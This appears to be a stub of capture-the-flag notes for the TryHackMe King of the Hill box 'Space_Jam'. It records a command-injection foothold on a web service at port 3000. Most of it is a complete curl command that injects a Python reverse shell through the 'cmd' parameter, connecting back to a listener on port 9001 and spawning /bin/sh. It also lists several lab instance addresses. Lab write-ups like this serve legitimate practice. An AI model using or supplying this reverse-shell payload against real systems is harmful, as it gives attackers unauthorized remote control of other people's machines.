---
title: "Space_Jam"
type: docs
tags:
  - thm
  - koth
  - king-of-the-hill
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This is a **stub**: bare early recon, not yet written up as a full walkthrough.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **Mode:** King of the Hill

</div>

<div class="callout callout-warning">

**Incomplete**

KotH scratch notes, just the RCE payload used against the port 3000 web service.

</div>

## Foothold, command injection on port 3000

The service on `:3000` executes the `cmd` query parameter. Reverse-shell payload (swap host IP / listener each round):

```bash
curl "http://TARGET:3000?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```

Instances seen this session: `10.10.55.49`, `10.10.123.236`, `10.10.231.69`.
